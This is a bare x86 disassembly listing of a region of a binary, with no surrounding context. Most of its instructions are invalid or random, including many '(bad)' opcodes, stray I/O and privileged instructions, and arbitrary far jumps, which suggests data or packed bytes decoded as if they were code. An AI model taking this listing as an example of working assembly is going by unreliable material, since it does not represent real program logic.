  41bdc7:	jg     0x41bdbe
  41bdc9:	xchg   ecx,eax
  41bdca:	lahf   
  41bdcb:	cmp    al,0xa9
  41bdcd:	(bad)  
  41bdcf:	jb     0x41be1f
  41bdd1:	dec    ebp
  41bdd2:	or     esi,DWORD PTR [eax+0x26]
  41bdd5:	jmp    DWORD PTR [edi+ebp*4-0x3d]
  41bdd9:	pop    esp
  41bdda:	or     eax,0xfad1cdef
  41bddf:	sbb    bh,BYTE PTR [esp+eiz*2+0x252148cb]
  41bde6:	div    DWORD PTR [esi]
  41bde8:	fwait
  41bde9:	lahf   
  41bdea:	xchg   ebx,eax
  41bdeb:	mov    ah,0xa8
  41bded:	add    edi,DWORD PTR [eax]
  41bdef:	pop    edx
  41bdf0:	add    bh,cl
  41bdf2:	fcmovnbe st,st(5)
  41bdf4:	fs jbe 0x41be3c
  41bdf7:	mov    ebp,0xca520f61
  41bdfc:	mov    bl,0x9b
  41bdfe:	lldt   WORD PTR [esi+0x16c053fd]
  41be05:	out    dx,eax
  41be06:	call   0x30c5762e
  41be0b:	(bad)  
  41be0c:	pop    ds
  41be0d:	ds xor eax,0xde3639d8
  41be13:	inc    esi
  41be14:	mov    ebx,0xf04d40c2
  41be19:	pop    es
  41be1a:	mov    esp,0x5175ed80
  41be1f:	cmp    BYTE PTR [ecx],dl
  41be21:	jbe    0x41be7f
  41be23:	in     al,0x2
  41be25:	push   edx
  41be26:	repnz mov ebp,DWORD PTR [ebx-0x2c]
  41be2a:	lods   eax,DWORD PTR ds:[esi]
  41be2b:	aad    0xc8
  41be2d:	jge    0x41be38
  41be2f:	enter  0x769f,0xa0
  41be33:	sub    eax,0x1ff7ad3c
  41be38:	xchg   edx,eax
  41be39:	retf   
  41be3a:	inc    ecx
  41be3b:	cmp    al,0x51
  41be3d:	dec    eax
  41be3e:	repz pop esi
  41be40:	sub    dh,BYTE PTR ds:0x4e85cc22
  41be46:	and    al,0x94
  41be48:	jbe    0x41be5f
  41be4a:	cwde   
  41be4b:	or     ch,cl
  41be4d:	and    ebx,DWORD PTR [eax]
  41be4f:	mov    ds:0xb898d626,eax
  41be54:	and    ebp,DWORD PTR [ecx]
  41be56:	add    DWORD PTR [esi-0x58],edx
  41be59:	fstp   DWORD PTR [esi]
  41be5b:	stos   BYTE PTR es:[edi],al
  41be5c:	jp     0x41be76
  41be5e:	add    bh,ch
  41be60:	fcom   DWORD PTR [ebx+ebp*4-0x532eec75]
  41be67:	inc    edx
  41be68:	(bad)  [edx-0x67362a3a]
  41be6e:	cmp    edx,DWORD PTR [edi]
  41be70:	adc    ecx,DWORD PTR [edx+0x6]
  41be73:	retf   0xbccf
  41be76:	inc    ebx
  41be77:	cld    
  41be78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be79:	mov    edx,0xeeae6b64
  41be7e:	retf   
  41be7f:	jp     0x41bec2
  41be81:	mov    eax,ds:0x3827a2bf
  41be86:	sub    al,0xa3
  41be88:	mov    ch,0x1
  41be8a:	cld    
  41be8b:	outs   dx,BYTE PTR ds:[esi]
  41be8c:	mov    eax,0x19520d7b
  41be91:	jp     0x41be96
  41be93:	mov    ecx,0x6ffeb3ad
  41be98:	jp     0x41be35
  41be9a:	outs   dx,BYTE PTR ds:[esi]
  41be9b:	nop
  41be9c:	call   0xb03af4d3
  41bea1:	repnz sub al,0xf3
  41bea4:	aaa    
  41bea5:	cmp    esp,DWORD PTR [esi]
  41bea7:	imul   ecx,DWORD PTR [ecx+0x610f1a7c],0xffffff80
  41beae:	inc    ebp
  41beaf:	sub    DWORD PTR [eax+0x49],esi
  41beb2:	adc    BYTE PTR [ebp+0x2e],bl
  41beb5:	mov    ebx,0xed77e6ab
  41beba:	les    esi,FWORD PTR [ecx+0x1f]
  41bebd:	xor    cl,ah
  41bebf:	dec    ebp
  41bec0:	ret    0x4bb2
  41bec3:	cmp    eax,DWORD PTR [ecx]
  41bec5:	aad    0x29
  41bec7:	mov    al,0x2c
  41bec9:	(bad)  
  41beca:	popf   
  41becb:	pop    es
  41becc:	jno    0x41bec6
  41bece:	leave  
  41becf:	int3   
  41bed0:	test   cl,al
  41bed2:	(bad)  
  41bed3:	sbb    dh,bh
  41bed5:	or     eax,0x1ba484e3
  41beda:	sbb    eax,0x8a14690f
  41bedf:	mov    ?,WORD PTR [ebx-0x7afe9a8b]
  41bee5:	pop    ss
  41bee6:	jnp    0x41be71
  41bee8:	mov    ebx,0x8c8b5b6a
  41beed:	fdivr  DWORD PTR [edi]
  41beef:	add    eax,esp
  41bef1:	jl     0x41bed5
  41bef3:	in     eax,dx
  41bef4:	aad    0x54
  41bef6:	aaa    
  41bef7:	pop    ss
  41bef8:	sbb    DWORD PTR [ebx+0x471e0c8a],edi
  41befe:	cmp    DWORD PTR [esi-0x7b],esp
  41bf01:	out    dx,al
  41bf02:	push   0x1024470a
  41bf07:	add    ch,BYTE PTR [esi-0x38e22178]
  41bf0d:	jecxz  0x41be92
  41bf0f:	retf   0x6455
  41bf12:	scas   eax,DWORD PTR es:[edi]
  41bf13:	add    edi,ecx
  41bf15:	hlt    
  41bf16:	cld    
  41bf17:	data16 sub BYTE PTR [eax+0x5e43c975],cl
  41bf1e:	aad    0x8
  41bf20:	push   edi
  41bf21:	iret   
  41bf22:	sti    
  41bf23:	push   es
  41bf24:	aam    0xc
  41bf26:	aad    0xbc
  41bf28:	pop    edx
  41bf29:	xor    edx,DWORD PTR [esi+0x6b]
  41bf2c:	loop   0x41bf99
  41bf2e:	sar    esi,cl
  41bf30:	in     al,dx
  41bf31:	push   ebx
  41bf32:	gs mov esi,0x3a8658b9
  41bf38:	xchg   edi,eax
  41bf39:	adc    eax,eax
  41bf3b:	sahf   
  41bf3c:	inc    edx
  41bf3d:	mov    WORD PTR [edi-0x71],cs
  41bf40:	mov    dl,0xe9
  41bf42:	mov    ch,0x2a
  41bf44:	shr    BYTE PTR [edi],cl
  41bf46:	retf   0xbc0d
  41bf49:	call   0x9a475bc8
  41bf4e:	pushf  
  41bf4f:	and    esi,DWORD PTR [ebx]
  41bf51:	shr    BYTE PTR [eax-0x1489ac32],1
  41bf57:	xchg   BYTE PTR [ecx],dl
  41bf59:	in     al,dx
  41bf5a:	sub    DWORD PTR [ebx+0x5f],0x6b
  41bf5e:	mov    ebp,ebx
  41bf60:	mov    edi,0x30e44f71
  41bf65:	(bad)  
  41bf66:	adc    cl,dh
  41bf68:	ror    eax,0x68
  41bf6b:	push   esi
  41bf6c:	sub    bl,dl
  41bf6e:	call   esp
  41bf70:	sub    cl,BYTE PTR [ebp-0x3]
  41bf73:	stos   BYTE PTR es:[edi],al
  41bf74:	test   al,0xf6
  41bf76:	mov    esi,0x5e5b7dbe
  41bf7b:	inc    esp
  41bf7c:	xor    eax,0xf7c55b26
  41bf81:	inc    edx
  41bf82:	add    dl,BYTE PTR [esi-0x7ae3ac0d]
  41bf88:	sub    eax,0xd5776b5b
  41bf8d:	push   cs
  41bf8e:	jecxz  0x41bf1f
  41bf90:	add    al,0xcc
  41bf92:	je     0x41bf19
  41bf94:	lahf   
  41bf95:	sub    DWORD PTR ds:0x57f7e4f4,ebp
  41bf9b:	jnp    0x41bfbc
  41bf9d:	ds out dx,eax
  41bf9f:	and    ch,BYTE PTR [ebx+0x32]
  41bfa2:	dec    eax
  41bfa3:	push   ebx
  41bfa4:	js     0x41bf42
  41bfa6:	or     eax,0xa21f5b7d
  41bfab:	aas    
  41bfac:	sub    ch,ch
  41bfae:	xlat   BYTE PTR ds:[ebx]
  41bfaf:	pusha  
  41bfb0:	aam    0x42
  41bfb2:	add    DWORD PTR [edx],0xd67c0b6e
  41bfb8:	iret   
  41bfb9:	mov    esp,0x15358a57
  41bfbe:	bound  ebp,QWORD PTR [ebp+ecx*4+0x72980a8c]
  41bfc5:	xor    al,BYTE PTR [eax]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	and    eax,0xb8216b19
  41bff4:	call   0x7e523878
  41bff9:	js     0x41c073
  41bffb:	ror    DWORD PTR ss:[eax],cl
  41bffe:	ins    BYTE PTR es:[edi],dx
  41bfff:	(bad)  
  41c000:	(bad)  [edi+0x17cf08e2]
  41c006:	fild   QWORD PTR [eax]
  41c008:	and    bl,al
  41c00a:	cld    
  41c00b:	cli    
  41c00c:	arpl   WORD PTR [ebp+ecx*8+0x32],bx
  41c010:	ficom  WORD PTR [edi+0x75ea4a66]
  41c016:	leave  
  41c017:	loopne 0x41c06e
  41c019:	(bad)  
  41c01a:	std    
  41c01b:	je     0x41c08b
  41c01d:	or     al,0x37
  41c01f:	mov    edi,0xb5aa3980
  41c024:	or     edx,edx
  41c026:	pop    es
  41c027:	push   edx
  41c028:	xor    eax,0x7e2a38f3
  41c02d:	add    al,dl
  41c02f:	(bad)  
  41c030:	iret   
  41c031:	push   esi
  41c032:	enter  0x65e4,0x17
  41c036:	jns    0x41c090
  41c038:	mov    dh,0x38
  41c03a:	mov    al,ds:0x5495c757
  41c03f:	mov    edx,0x97fff09a
  41c044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c045:	out    0x66,eax
  41c047:	mov    al,ds:0x77d6ee55
  41c04c:	mov    ds:0x4af9da21,eax
  41c051:	jno    0x41c09c
  41c053:	adc    al,0x0
  41c055:	push   eax
  41c056:	test   DWORD PTR [ebx+0x6c],0xc0592dfa
  41c05d:	dec    esp
  41c05e:	repz sbb BYTE PTR [esi],dl
  41c061:	and    esi,DWORD PTR [edx+0x13a6b51d]
  41c067:	mov    eax,0xceccd85c
  41c06c:	push   ss
  41c06d:	test   eax,0xfb702f6a
  41c072:	mov    ds:0x47d6403d,al
  41c077:	les    ebx,FWORD PTR [ecx]
  41c079:	mov    ch,0xcf
  41c07b:	xor    dl,ch
  41c07d:	mov    al,0x1e
  41c07f:	stc    
  41c080:	cmc    
  41c081:	rol    eax,1
  41c083:	push   ds
  41c084:	add    DWORD PTR [ebx+0x21],edi
  41c087:	aam    0xa3
  41c089:	pop    eax
  41c08a:	sub    al,0xb6
  41c08c:	mov    cl,0x59
  41c08e:	das    
  41c08f:	xor    dl,BYTE PTR [ecx-0x6dd805c6]
  41c095:	mov    bl,0xeb
  41c097:	fsubr  st(0),st
  41c099:	inc    esi
  41c09a:	xchg   edi,eax
  41c09b:	outs   dx,BYTE PTR ds:[esi]
  41c09c:	xchg   ebp,eax
  41c09d:	fwait
  41c09e:	push   ds
  41c09f:	xor    eax,0x1588211
  41c0a4:	push   ss
  41c0a5:	sbb    cl,0x5f
  41c0a8:	dec    ebp
  41c0a9:	addr16 imul ebx,edx,0xd45b770d
  41c0b0:	jbe    0x41c06f
  41c0b2:	cdq    
  41c0b3:	inc    eax
  41c0b4:	lods   eax,DWORD PTR ds:[esi]
  41c0b5:	aad    0xdd
  41c0b7:	scas   al,BYTE PTR es:[edi]
  41c0b8:	(bad)  
  41c0ba:	cmp    ecx,esp
  41c0bc:	push   esp
  41c0bd:	jns    0x41c11a
  41c0bf:	imul   esi,DWORD PTR [edx+ebx*2-0x9],0xd68d0e36
  41c0c7:	aam    0xf0
  41c0c9:	mov    eax,ds:0x3df30656
  41c0ce:	ja     0x41c11d
  41c0d0:	and    DWORD PTR [ecx-0x5083e7a9],0xdc194423
  41c0da:	inc    edx
  41c0db:	jns    0x41c133
  41c0dd:	or     al,BYTE PTR ds:0xe16885c8
  41c0e3:	lods   eax,DWORD PTR ds:[esi]
  41c0e4:	test   DWORD PTR [edx+0x413fa95e],edi
  41c0ea:	(bad)  
  41c0eb:	fld    QWORD PTR [ecx+0x58]
  41c0ee:	addr16 ret 0x33fa
  41c0f2:	sub    bl,0xb0
  41c0f5:	in     al,dx
  41c0f6:	mov    bl,0x16
  41c0f8:	rcr    BYTE PTR [ecx],cl
  41c0fa:	test   DWORD PTR [eax],esp
  41c0fc:	sbb    edx,DWORD PTR [eax+ebp*8]
  41c0ff:	nop
  41c100:	or     al,0xde
  41c102:	aam    0x17
  41c104:	aad    0xd8
  41c106:	jnp    0x41c13a
  41c108:	sbb    bl,BYTE PTR [edx-0x3db4cd5c]
  41c10e:	sti    
  41c10f:	int    0x3
  41c111:	call   0x689c9d0
  41c116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c117:	stc    
  41c118:	inc    ecx
  41c119:	mov    cl,0xe2
  41c11b:	int3   
  41c11c:	jle    0x41c0ff
  41c11e:	xchg   DWORD PTR [ebp-0x5c430bfe],esi
  41c124:	call   0xc19a:0x106d68f0
  41c12b:	add    DWORD PTR [ebp-0x67],0xe0b20cfb
  41c132:	pop    esi
  41c133:	xchg   esi,eax
  41c134:	das    
  41c135:	mov    cx,WORD PTR [ebx+0x50]
  41c139:	jb     0x41c18e
  41c13b:	xlat   BYTE PTR ds:[ebx]
  41c13c:	js     0x41c195
  41c13e:	jmp    0x3def:0x8530c63e
  41c145:	sub    DWORD PTR [ecx+0x10946095],esi
  41c14b:	pop    es
  41c14c:	xor    al,0x52
  41c14e:	ror    ebx,cl
  41c150:	mov    bh,0xba
  41c152:	ja     0x41c113
  41c154:	mov    al,0x3a
  41c156:	push   ebx
  41c157:	dec    ecx
  41c158:	sub    dl,BYTE PTR ds:0x5e280d25
  41c15e:	popf   
  41c15f:	in     al,0xe
  41c161:	xchg   ebp,eax
  41c162:	in     al,dx
  41c163:	retf   
  41c164:	sub    esi,ebp
  41c166:	add    bh,0x44
  41c169:	mov    dl,bh
  41c16b:	ds xor eax,0xf2282801
  41c171:	xchg   BYTE PTR ds:0x989d9093,bh
  41c177:	sbb    DWORD PTR [ecx],edx
  41c179:	xchg   ecx,eax
  41c17a:	mov    ch,0xc6
  41c17c:	popf   
  41c17d:	sbb    DWORD PTR [ebx+0xd],ebx
  41c180:	fcom   QWORD PTR [ecx+0x38]
  41c183:	hlt    
  41c184:	(bad)
  41c187:	jg     0x41c1d4
  41c189:	mov    ecx,0xe83a3fef
  41c18e:	xor    al,al
  41c190:	jo     0x41c142
  41c192:	mov    dh,0x8a
  41c194:	xor    BYTE PTR [esi-0x16],bl
  41c197:	bound  ebx,QWORD PTR [ebx-0x22]
  41c19a:	rol    DWORD PTR [edx+0x2a4ddce3],1
  41c1a0:	pusha  
  41c1a1:	cmp    eax,0xaaeec4ca
  41c1a6:	cmp    eax,0xf72a4109
  41c1ab:	jo     0x41c132
  41c1ad:	or     eax,0x6a6b5938
  41c1b2:	dec    ebp
  41c1b3:	mov    dh,0xcb
  41c1b5:	dec    eax
  41c1b6:	or     al,0xfb
  41c1b8:	or     bl,ah
  41c1ba:	pushf  
  41c1bb:	retf   0xd088
  41c1be:	cli    
  41c1bf:	jae    0x41c201
  41c1c1:	js     0x41c219
  41c1c3:	in     al,0xa3
  41c1c5:	jmp    0x9f757501
  41c1ca:	mov    bl,0xf3
  41c1cc:	(bad)  
  41c1cd:	lds    ebp,FWORD PTR [ecx]
  41c1cf:	out    0x70,al
  41c1d1:	jns    0x41c16b
  41c1d3:	cmp    ebp,edi
  41c1d5:	f2xm1  
  41c1d7:	jg     0x41c18e
  41c1d9:	jg     0x41c163
  41c1db:	fbstp  TBYTE PTR [esi]
  41c1dd:	mov    ch,0xa3
  41c1df:	in     eax,0x63
  41c1e1:	div    DWORD PTR [eax+0x41]
  41c1e4:	or     ebx,ebx
  41c1e6:	push   0xffffffab
  41c1e8:	sbb    bl,BYTE PTR ss:[edx+0x790b33f1]
  41c1ef:	or     BYTE PTR [ecx],dh
  41c1f1:	adc    BYTE PTR [ecx],dl
  41c1f3:	repz test BYTE PTR [ebp-0x68],ch
  41c1f7:	jno    0x41c225
  41c1f9:	cmp    bh,BYTE PTR [esi+ebx*4]
  41c1fc:	dec    ebp
  41c1fd:	jne    0x41c216
  41c1ff:	jnp    0x41c187
  41c201:	and    esi,ecx
  41c203:	mov    ch,0xf5
  41c205:	sbb    al,0xaf
  41c207:	xor    esi,ecx
  41c209:	adc    edx,DWORD PTR [eax]
  41c20b:	fild   QWORD PTR [ecx+0x64556fd3]
  41c211:	lods   al,BYTE PTR ds:[esi]
  41c212:	inc    edx
  41c213:	xor    eax,0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	xlat   BYTE PTR ds:[ebx]
  41c22c:	sub    BYTE PTR [ecx],bl
  41c22e:	cmc    
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c1d7
  41c238:	xchg   esi,eax
  41c239:	shl    BYTE PTR [edi+0x11],cl
  41c23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c23d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c23e:	into   
  41c23f:	gs pop esp
  41c241:	repz test eax,0x8242c6cd
  41c247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c248:	adc    eax,0x8814fa6
  41c24d:	pop    edi
  41c24e:	loopne 0x41c1e5
  41c250:	xor    dh,BYTE PTR [ebx]
  41c252:	scas   al,BYTE PTR es:[edi]
  41c253:	pop    ecx
  41c254:	and    ah,dl
  41c256:	pop    ebp
  41c257:	ins    BYTE PTR es:[edi],dx
  41c258:	(bad)  [eax]
  41c25a:	nop
  41c25b:	mov    bh,0xcb
  41c25d:	push   ebx
  41c25e:	aaa    
  41c25f:	inc    eax
  41c260:	popf   
  41c261:	aaa    
  41c262:	mov    al,0x80
  41c264:	adc    edi,DWORD PTR [ebp-0x18]
  41c267:	repnz test eax,0x345439c9
  41c26d:	mov    al,ds:0x7e0a9805
  41c272:	or     BYTE PTR [ecx+0x21b963aa],dl
  41c278:	sar    BYTE PTR [eax+0x6a],0x76
  41c27c:	xchg   ecx,eax
  41c27d:	shr    esi,0x37
  41c280:	(bad)  
  41c281:	sar    BYTE PTR [ecx+esi*1],cl
  41c284:	xor    ebp,esi
  41c286:	sub    al,BYTE PTR ds:0x143322e3
  41c28c:	mov    edi,0x18433dfb
  41c291:	sub    BYTE PTR [edi+ecx*8],0x88
  41c295:	and    cl,BYTE PTR [eax]
  41c297:	sub    BYTE PTR es:[ebx+0x52f5609f],bh
  41c29e:	push   eax
  41c29f:	or     BYTE PTR [esi-0x30],cl
  41c2a2:	loope  0x41c30f
  41c2a4:	enter  0x18e6,0x39
  41c2a8:	out    dx,eax
  41c2a9:	sub    eax,0x1fb321d1
  41c2ae:	mov    ch,0xcf
  41c2b0:	jp     0x41c28e
  41c2b2:	out    0xbd,al
  41c2b4:	xchg   BYTE PTR ds:0x1e63c505,bl
  41c2ba:	jg     0xd5505774
  41c2c0:	(bad)  
  41c2c1:	pusha  
  41c2c2:	loope  0x41c2ac
  41c2c4:	adc    BYTE PTR ds:0x1d63dc5,cl
  41c2ca:	in     eax,dx
  41c2cb:	retf   0x51ab
  41c2ce:	mov    ch,0x31
  41c2d0:	mov    eax,0x10e4773e
  41c2d5:	cli    
  41c2d6:	ror    dh,cl
  41c2d8:	xor    eax,0xb4c7355f
  41c2dd:	sti    
  41c2de:	in     eax,0x16
  41c2e0:	jae    0x41c35e
  41c2e2:	or     cl,BYTE PTR [eax+0x78]
  41c2e5:	test   eax,0x690a5ee4
  41c2ea:	mov    eax,0xa64536d1
  41c2ef:	je     0x41c277
  41c2f1:	std    
  41c2f2:	pop    ds
  41c2f3:	into   
  41c2f4:	fdivp  st(6),st
  41c2f6:	outs   dx,BYTE PTR ds:[esi]
  41c2f7:	popf   
  41c2f8:	mov    ds:0x8a9e86c2,eax
  41c2fd:	aam    0x48
  41c2ff:	add    cl,dh
  41c301:	std    
  41c302:	sub    ebp,DWORD PTR [esi-0x1]
  41c305:	scas   eax,DWORD PTR es:[edi]
  41c306:	cmp    eax,0x4466bb4f
  41c30b:	pop    es
  41c30c:	jo     0x41c302
  41c30e:	adc    ch,BYTE PTR ds:0x78b16a35
  41c314:	fnstenv [edi-0x41]
  41c317:	cmc    
  41c318:	push   es
  41c319:	add    cl,BYTE PTR [esi+0x46f3f7a2]
  41c31f:	scas   eax,DWORD PTR es:[edi]
  41c320:	inc    eax
  41c321:	or     bh,ch
  41c323:	sbb    DWORD PTR [edi],edx
  41c325:	psadbw mm1,QWORD PTR [edi-0x52598bf2]
  41c32c:	test   eax,0x468d3b95
  41c331:	push   eax
  41c332:	dec    ecx
  41c333:	sub    al,0x22
  41c335:	mov    esi,0x49e5dc44
  41c33a:	rep fs ins BYTE PTR es:[edi],dx
  41c33d:	and    DWORD PTR [edx-0x2e],edx
  41c340:	inc    edx
  41c341:	cmp    DWORD PTR [ebx-0x55],0xffffffe9
  41c345:	add    DWORD PTR [edi],ebp
  41c347:	or     BYTE PTR [eax+0x7995908],ch
  41c34d:	iret   
  41c34e:	sar    BYTE PTR [ecx],cl
  41c350:	aaa    
  41c351:	lea    edx,ds:0x22f978d6
  41c357:	sub    eax,0xe85dda9e
  41c35c:	fsubrp st(5),st
  41c35e:	sub    al,0x74
  41c360:	mov    edi,0xc08300b0
  41c365:	dec    ebp
  41c366:	dec    edi
  41c367:	repz cmp esp,ebx
  41c36a:	adc    eax,0x8f1ed881
  41c36f:	stos   DWORD PTR es:[edi],eax
  41c370:	stos   DWORD PTR es:[edi],eax
  41c371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c372:	call   DWORD PTR [edx]
  41c374:	dec    ebp
  41c375:	and    edx,DWORD PTR [eax-0x52370fb]
  41c37b:	aam    0xd1
  41c37d:	inc    edi
  41c37e:	ret    
  41c37f:	jne    0x41c3c7
  41c381:	mov    edi,0xa254005f
  41c386:	sahf   
  41c387:	dec    eax
  41c388:	and    eax,0x1681b15b
  41c38d:	(bad)  ss:[ebp-0x11]
  41c391:	ret    
  41c392:	jno    0x41c3ba
  41c394:	cld    
  41c395:	(bad)  
  41c397:	cwde   
  41c398:	jecxz  0x41c400
  41c39a:	lods   eax,DWORD PTR ds:[esi]
  41c39b:	test   eax,0x4a86dc0e
  41c3a0:	jg     0x41c323
  41c3a2:	add    dh,BYTE PTR [ecx+0x4]
  41c3a5:	xchg   al,ah
  41c3a7:	sub    DWORD PTR [esi],edi
  41c3a9:	imul   ecx,DWORD PTR ds:0xdceab323,0x68312584
  41c3b3:	fwait
  41c3b4:	jb     0x41c3a7
  41c3b6:	jmp    DWORD PTR [ebx-0x45]
  41c3b9:	fnsave [ecx+0x1a62bb94]
  41c3bf:	in     eax,0x2c
  41c3c1:	(bad)  
  41c3c2:	and    esp,esp
  41c3c4:	ss push ds
  41c3c6:	sbb    eax,DWORD PTR [eax]
  41c3c8:	xchg   ecx,eax
  41c3c9:	sub    BYTE PTR [ecx+0x319565aa],0x87
  41c3d0:	addr16 xchg edi,eax
  41c3d2:	outs   dx,DWORD PTR ds:[esi]
  41c3d3:	sbb    eax,0xe43b78a
  41c3d8:	and    eax,0x92f16fb6
  41c3dd:	enter  0x1285,0xf8
  41c3e1:	cmp    BYTE PTR [ecx-0x7d40569e],ah
  41c3e7:	mov    al,0xd6
  41c3e9:	hlt    
  41c3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3eb:	cmp    DWORD PTR [eax],eax
  41c3ed:	shr    ah,1
  41c3ef:	mov    esi,0x23b29e6c
  41c3f4:	and    ebp,DWORD PTR [ecx+ebp*1-0x69]
  41c3f8:	jle    0x41c45a
  41c3fa:	inc    edx
  41c3fb:	inc    edi
  41c3fc:	mov    eax,0xe6fefac6
  41c401:	ror    DWORD PTR [ebx+0x5d],cl
  41c404:	out    0xcb,eax
  41c406:	stc    
  41c407:	or     dh,BYTE PTR [ebp-0x5ded89d1]
  41c40d:	sbb    eax,DWORD PTR [edi]
  41c40f:	mov    ah,0xf1
  41c411:	outs   dx,DWORD PTR ds:[esi]
  41c412:	or     eax,0x131a7555
  41c417:	add    al,0xa3
  41c419:	or     cl,BYTE PTR [esi+0x0]
  41c41c:	push   0xffffffcb
  41c41e:	test   al,0x4a
  41c420:	mov    ebx,0x350bff7e
  41c425:	jne    0x41c44b
  41c427:	push   ss
  41c428:	dec    ecx
  41c429:	pop    esp
  41c42a:	xor    esp,DWORD PTR [ecx-0x1d55c72d]
  41c430:	(bad)  
  41c431:	sbb    DWORD PTR [edx-0x7c],eax
  41c434:	fiadd  DWORD PTR [esi+0x773a9df8]
  41c43a:	sbb    eax,0xfcb18910
  41c43f:	in     al,dx
  41c440:	or     edx,DWORD PTR [ebp+0x21]
  41c443:	cs sub eax,0x783eba58
  41c449:	fwait
  41c44a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c44b:	pop    ds
  41c44c:	loope  0x41c450
  41c44e:	mov    DWORD PTR es:[ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c427
  41c464:	sar    BYTE PTR [edx],0x1a
  41c467:	push   0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c4ae
  41c470:	call   0x38e1:0x423e24b
  41c477:	mov    eax,ds:0xfa488f77
  41c47c:	add    cl,BYTE PTR ds:0x4c148a31
  41c482:	inc    ebp
  41c483:	test   BYTE PTR [esp+eiz*8-0x2e],0x81
  41c488:	int3   
  41c489:	sub    edx,DWORD PTR ds:0x794abd5c
  41c48f:	and    BYTE PTR [eax+0x58],dl
  41c492:	push   ebx
  41c493:	dec    ebx
  41c494:	sbb    dl,BYTE PTR [ebp+0x6b]
  41c497:	int    0x83
  41c499:	iret   
  41c49a:	ja     0x41c4b4
  41c49c:	mov    BYTE PTR [ebp-0x3af1983],ch
  41c4a2:	sub    eax,0x663e799f
  41c4a7:	outs   dx,BYTE PTR ds:[esi]
  41c4a8:	inc    esi
  41c4a9:	push   esi
  41c4aa:	jb     0x41c468
  41c4ac:	and    ecx,DWORD PTR ds:0x50b59ac6
  41c4b2:	adc    eax,0xb68c421f
  41c4b7:	push   0x3e504439
  41c4bc:	xchg   esi,eax
  41c4bd:	cdq    
  41c4be:	jno    0x41c502
  41c4c0:	pop    edi
  41c4c1:	adc    dl,BYTE PTR ds:0x5029560f
  41c4c7:	sahf   
  41c4c8:	and    esp,DWORD PTR [ecx+ebx*2-0x73bf815a]
  41c4cf:	cdq    
  41c4d0:	adc    bh,cl
  41c4d2:	or     edx,DWORD PTR [ecx]
  41c4d4:	into   
  41c4d5:	ss (bad) 
  41c4d7:	mov    WORD PTR [ebx+0x6c],?
  41c4da:	xchg   edx,eax
  41c4db:	daa    
  41c4dc:	scas   eax,DWORD PTR es:[edi]
  41c4dd:	jge    0x41c469
  41c4df:	push   cs
  41c4e0:	in     eax,dx
  41c4e1:	push   ds
  41c4e2:	add    eax,0xb8bb3272
  41c4e7:	lahf   
  41c4e8:	xchg   ebp,eax
  41c4e9:	cwde   
  41c4ea:	sub    eax,0x70f81d26
  41c4ef:	jmp    0x511f:0x5b747929
  41c4f6:	inc    edx
  41c4f7:	enter  0xdaad,0x2b
  41c4fb:	out    dx,al
  41c4fc:	mov    eax,ds:0xe0f4e495
  41c501:	(bad)  
  41c502:	aas    
  41c503:	jle    0x41c53e
  41c505:	dec    ecx
  41c506:	mov    eax,ds:0xbaadb018
  41c50b:	jg     0x41c585
  41c50d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c50f:	lea    ebp,[ebx]
  41c511:	mov    ch,0xcd
  41c513:	mov    ch,0xe1
  41c515:	xor    BYTE PTR [esi+edi*4-0x60],ah
  41c519:	popf   
  41c51a:	dec    edx
  41c51b:	xchg   BYTE PTR ds:0x1c6560b3,al
  41c521:	leave  
  41c522:	cld    
  41c523:	jnp    0x41c4f0
  41c525:	xor    al,dl
  41c527:	cld    
  41c528:	enter  0x8b53,0x31
  41c52c:	pop    ss
  41c52d:	inc    esp
  41c52e:	xchg   edx,eax
  41c52f:	mov    ah,0xa
  41c531:	fsubr  DWORD PTR [ecx]
  41c533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c534:	lock cmc 
  41c536:	lds    edi,FWORD PTR [ebx+0x53b10b43]
  41c53c:	fdivp  st(5),st
  41c53e:	mov    cl,0xf7
  41c540:	pop    edi
  41c541:	iret   
  41c542:	cmp    DWORD PTR [esi+0x18077aa3],edi
  41c548:	cdq    
  41c549:	fnstsw WORD PTR [ebx+0x40]
  41c54c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c54d:	xchg   esp,eax
  41c54e:	xchg   DWORD PTR [esp+eiz*2],ebx
  41c551:	loope  0x41c5cf
  41c553:	push   edx
  41c554:	inc    ebp
  41c555:	mov    ch,0xa5
  41c557:	cmp    DWORD PTR [edi],esp
  41c559:	mov    ds:0x881ebae2,al
  41c55e:	jmp    0x41c4e1
  41c560:	dec    esi
  41c561:	mov    ebp,0x6092a414
  41c566:	jbe    0x41c4f4
  41c568:	pop    es
  41c569:	xchg   BYTE PTR [ecx+0x61f6fa4d],ch
  41c56f:	stos   DWORD PTR es:[edi],eax
  41c570:	inc    eax
  41c571:	sbb    al,0xbd
